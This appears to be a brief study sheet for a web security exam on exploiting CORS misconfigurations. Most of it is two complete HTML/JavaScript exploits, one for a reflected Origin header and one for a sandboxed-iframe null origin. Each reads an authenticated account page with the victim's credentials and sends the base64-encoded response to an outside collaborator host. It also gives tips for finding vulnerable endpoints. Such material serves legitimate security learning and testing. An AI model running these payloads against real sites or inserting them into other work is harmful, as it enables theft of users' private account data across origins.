## 🎯 Overview

CORS misconfigurations allow attackers to read sensitive data from another origin via JavaScript.

## 🔥 Attack Techniques

### Basic CORS Exploit
**Scenario:** Server reflects `Origin` header in `Access-Control-Allow-Origin`

**Exploit:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

---

### Null Origin Bypass
**Scenario:** Server allows `null` origin

**Exploit (using iframe sandbox):**
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
"></iframe>
```
## 🎓 Exam Tips

1. **Check `/accountDetails` endpoint** - Common CORS misconfiguration location
2. **Test with arbitrary Origin** - See if reflected
3. **Try `null` origin** - Use iframe sandbox
4. **Combine with XSS** - XSS on subdomain + CORS = data theft
